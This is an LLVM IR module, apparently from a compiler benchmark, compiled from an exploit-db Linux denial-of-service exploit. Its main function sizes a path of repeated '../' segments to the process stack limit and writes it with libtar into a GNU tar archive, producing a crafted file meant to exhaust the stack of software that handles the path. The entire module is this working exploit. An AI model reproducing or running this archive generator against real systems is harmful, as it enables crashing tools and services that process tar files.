; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_30766.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_30766.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.rlimit = type { i32 }

@.str = private unnamed_addr constant [31 x i8] c"exactly two arguments expected\00", align 1
@RLIMIT_STACK = common dso_local global i32 0, align 4
@errno = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [23 x i8] c"getrlimit RLIMIT_STACK\00", align 1
@.str.2 = private unnamed_addr constant [11 x i8] c"malloc: %u\00", align 1
@.str.3 = private unnamed_addr constant [4 x i8] c"../\00", align 1
@O_WRONLY = common dso_local global i32 0, align 4
@O_CREAT = common dso_local global i32 0, align 4
@TAR_GNU = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [13 x i8] c"tar_open: %s\00", align 1
@.str.5 = private unnamed_addr constant [10 x i8] c"/dev/null\00", align 1
@.str.6 = private unnamed_addr constant [20 x i8] c"tar_append_file: %s\00", align 1
@.str.7 = private unnamed_addr constant [10 x i8] c"tar_close\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.rlimit, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = load i32, i32* %4, align 4
  %12 = icmp ne i32 %11, 2
  br i1 %12, label %13, label %15

13:                                               ; preds = %2
  %14 = call i32 (i32, i32, i8*, ...) @error(i32 1, i32 0, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str, i64 0, i64 0))
  br label %15

15:                                               ; preds = %13, %2
  %16 = load i32, i32* @RLIMIT_STACK, align 4
  %17 = call i64 @getrlimit(i32 %16, %struct.rlimit* %6)
  %18 = icmp ne i64 %17, 0
  br i1 %18, label %19, label %22

19:                                               ; preds = %15
  %20 = load i32, i32* @errno, align 4
  %21 = call i32 (i32, i32, i8*, ...) @error(i32 1, i32 %20, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.1, i64 0, i64 0))
  br label %22

22:                                               ; preds = %19, %15
  %23 = getelementptr inbounds %struct.rlimit, %struct.rlimit* %6, i32 0, i32 0
  %24 = load i32, i32* %23, align 4
  %25 = sdiv i32 %24, 3
  %26 = add nsw i32 %25, 1
  store i32 %26, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = mul i32 %27, 3
  %29 = add i32 %28, 1
  %30 = call i8* @malloc(i32 %29)
  store i8* %30, i8** %9, align 8
  %31 = icmp ne i8* %30, null
  br i1 %31, label %38, label %32

32:                                               ; preds = %22
  %33 = load i32, i32* @errno, align 4
  %34 = load i32, i32* %7, align 4
  %35 = mul i32 %34, 3
  %36 = add i32 %35, 1
  %37 = call i32 (i32, i32, i8*, ...) @error(i32 1, i32 %33, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.2, i64 0, i64 0), i32 %36)
  br label %38

38:                                               ; preds = %32, %22
  store i32 0, i32* %8, align 4
  br label %39

39:                                               ; preds = %50, %38
  %40 = load i32, i32* %8, align 4
  %41 = load i32, i32* %7, align 4
  %42 = icmp ult i32 %40, %41
  br i1 %42, label %43, label %53

43:                                               ; preds = %39
  %44 = load i8*, i8** %9, align 8
  %45 = load i32, i32* %8, align 4
  %46 = mul i32 %45, 3
  %47 = zext i32 %46 to i64
  %48 = getelementptr inbounds i8, i8* %44, i64 %47
  %49 = call i32 @memcpy(i8* %48, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.3, i64 0, i64 0), i32 3)
  br label %50

50:                                               ; preds = %43
  %51 = load i32, i32* %8, align 4
  %52 = add i32 %51, 1
  store i32 %52, i32* %8, align 4
  br label %39

53:                                               ; preds = %39
  %54 = load i8*, i8** %9, align 8
  %55 = load i32, i32* %7, align 4
  %56 = mul i32 %55, 3
  %57 = zext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %54, i64 %57
  store i8 0, i8* %58, align 1
  %59 = load i8**, i8*** %5, align 8
  %60 = getelementptr inbounds i8*, i8** %59, i64 1
  %61 = load i8*, i8** %60, align 8
  %62 = load i32, i32* @O_WRONLY, align 4
  %63 = load i32, i32* @O_CREAT, align 4
  %64 = or i32 %62, %63
  %65 = load i32, i32* @TAR_GNU, align 4
  %66 = call i64 @tar_open(i32** %10, i8* %61, i32* null, i32 %64, i32 420, i32 %65)
  %67 = icmp ne i64 %66, 0
  br i1 %67, label %68, label %74

68:                                               ; preds = %53
  %69 = load i32, i32* @errno, align 4
  %70 = load i8**, i8*** %5, align 8
  %71 = getelementptr inbounds i8*, i8** %70, i64 1
  %72 = load i8*, i8** %71, align 8
  %73 = call i32 (i32, i32, i8*, ...) @error(i32 1, i32 %69, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.4, i64 0, i64 0), i8* %72)
  br label %74

74:                                               ; preds = %68, %53
  %75 = load i32*, i32** %10, align 8
  %76 = load i8*, i8** %9, align 8
  %77 = call i64 @tar_append_file(i32* %75, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.5, i64 0, i64 0), i8* %76)
  %78 = icmp ne i64 %77, 0
  br i1 %78, label %79, label %85

79:                                               ; preds = %74
  %80 = load i32, i32* @errno, align 4
  %81 = load i8**, i8*** %5, align 8
  %82 = getelementptr inbounds i8*, i8** %81, i64 1
  %83 = load i8*, i8** %82, align 8
  %84 = call i32 (i32, i32, i8*, ...) @error(i32 1, i32 %80, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.6, i64 0, i64 0), i8* %83)
  br label %85

85:                                               ; preds = %79, %74
  %86 = load i32*, i32** %10, align 8
  %87 = call i64 @tar_close(i32* %86)
  %88 = icmp ne i64 %87, 0
  br i1 %88, label %89, label %92

89:                                               ; preds = %85
  %90 = load i32, i32* @errno, align 4
  %91 = call i32 (i32, i32, i8*, ...) @error(i32 1, i32 %90, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.7, i64 0, i64 0))
  br label %92

92:                                               ; preds = %89, %85
  ret i32 0
}

declare dso_local i32 @error(i32, i32, i8*, ...) #1

declare dso_local i64 @getrlimit(i32, %struct.rlimit*) #1

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i64 @tar_open(i32**, i8*, i32*, i32, i32, i32) #1

declare dso_local i64 @tar_append_file(i32*, i8*, i8*) #1

declare dso_local i64 @tar_close(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
